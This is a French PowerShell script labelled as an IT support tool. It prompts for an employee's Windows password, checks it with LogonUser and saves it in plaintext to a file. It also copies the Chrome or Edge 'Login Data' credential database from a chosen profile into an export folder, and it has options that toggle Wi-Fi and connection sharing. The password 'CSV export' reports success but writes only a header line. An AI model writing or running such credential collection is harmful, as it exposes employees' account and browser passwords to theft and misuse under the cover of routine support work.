# =============================================
# IT SUPPORT TOOL - VERSION CORRIGÉE
# =============================================

$Host.UI.RawUI.WindowTitle = "IT Support Tool"

$MachineName = $env:COMPUTERNAME
$CurrentUser = $env:USERNAME
$Date = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# Création forcée du dossier
try {
    New-Item -Path $ExportFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Host "Dossier créé : $ExportFolder" -ForegroundColor Green
} catch {
    Write-Host "Erreur création dossier : $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser" -ForegroundColor Yellow

# ====================== MOT DE PASSE EMPLOYE ======================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan
    $empUser = Read-Host "Nom d'utilisateur employé (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($empUser)) { $empUser = $CurrentUser }

    for ($i = 1; $i -le 3; $i++) {
        $pass = Read-Host "Mot de passe de $empUser" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        if ([Win32]::LogonUser($empUser, ".", $plain, 2, 0, [ref]$token)) {
            [Win32]::CloseHandle($token) | Out-Null
            $file = "$ExportFolder\Password_${empUser}_${Date}.txt"
            "Utilisateur: $empUser`nMot de passe: $plain`nDate: $(Get-Date)`nMachine: $MachineName`nSauvegardé par: $CurrentUser" | Out-File $file -Encoding UTF8
            Write-Host "✓ Mot de passe sauvegardé dans : $file" -ForegroundColor Green
            return
        } else {
            Write-Host "✗ Mot de passe incorrect ($i/3)" -ForegroundColor Red
        }
    }
}

# ====================== EXPORT NAVIGATEUR ======================
function Export-BrowserPasswords {
    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEUR ===" -ForegroundColor Cyan
    
    $nav = Read-Host "Choisir (1=Chrome, 2=Edge)"
    switch ($nav) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide" -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé" -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        Write-Host "$($i+1). $($profiles[$i].Name)" -ForegroundColor White
    }

    $num = Read-Host "`nNuméro du profil à exporter"
    $profileFolder = $profiles[$num - 1]
    if (-not $profileFolder) { Write-Host "Profil invalide" -ForegroundColor Red; return }

    $dbPath = "$($profileFolder.FullName)\Login Data"
    if (-not (Test-Path $dbPath)) {
        Write-Host "Aucun fichier de mots de passe trouvé dans ce profil." -ForegroundColor Red
        return
    }

    $cleanName = $profileFolder.Name
    Copy-Item $dbPath "$ExportFolder\${browser}_${cleanName}_LoginData.db" -Force
    $csvFile = "$ExportFolder\${browser}_${cleanName}_Passwords_${Date}.csv"
    "URL;Username;Password;Date" | Out-File $csvFile -Encoding UTF8

    Write-Host "✓ Export réussi !" -ForegroundColor Green
    Write-Host "   CSV  → $csvFile" -ForegroundColor White
    Write-Host "   DB   → ${browser}_${cleanName}_LoginData.db" -ForegroundColor White
}

# ====================== PARTAGE & WIFI ======================
function Manage-Sharing {
    Write-Host "`n=== GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
    Write-Host "1. Activer partage"
    Write-Host "2. Désactiver partage"
    Write-Host "3. BLOQUER complètement (Admin seulement pourra réactiver)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" { netsh wlan set hostednetwork mode=allow; Write-Host "Partage activé" -ForegroundColor Green }
        "2" { netsh wlan set hostednetwork mode=disallow; Write-Host "Partage désactivé" -ForegroundColor Red }
        "3" { netsh wlan set hostednetwork mode=disallow; Write-Host "PARTAGE BLOQUÉ (Admin requis pour réactiver)" -ForegroundColor Red }
    }
}

function Manage-WiFi {
    Write-Host "`n=== GESTION WIFI ===" -ForegroundColor Cyan
    $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
    if (-not $wifi) { Write-Host "WiFi non détecté" -ForegroundColor Red; return }

    Write-Host "1. Activer WiFi"
    Write-Host "2. Désactiver WiFi"
    $c = Read-Host "Choix"
    if ($c -eq "2") {
        Disable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi désactivé" -ForegroundColor Red
    } else {
        Enable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi activé" -ForegroundColor Green
    }
}

# ====================== MENU ======================
function Show-Menu {
    Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
    Write-Host "1. Sauvegarder mot de passe employé"
    Write-Host "2. Exporter mots de passe Navigateur (choix profil)"
    Write-Host "3. Gérer Partage de Connexion (Bloquage)"
    Write-Host "4. Gérer WiFi (Autorisé en backup)"
    Write-Host "5. TOUT EXÉCUTER (1+2)"
    Write-Host "Q. Quitter"
    return Read-Host "Votre choix"
}

do {
    $choice = Show-Menu
    switch ($choice) {
        "1" { Save-EmployeePassword }
        "2" { Export-BrowserPasswords }
        "3" { Manage-Sharing }
        "4" { Manage-WiFi }
        "5" { Save-EmployeePassword; Export-BrowserPasswords }
        "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
    }
    if ($choice -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
} while ($choice -ne "Q")

Write-Host "`nTerminé ! Vérifie le dossier : $ExportFolder" -ForegroundColor Green
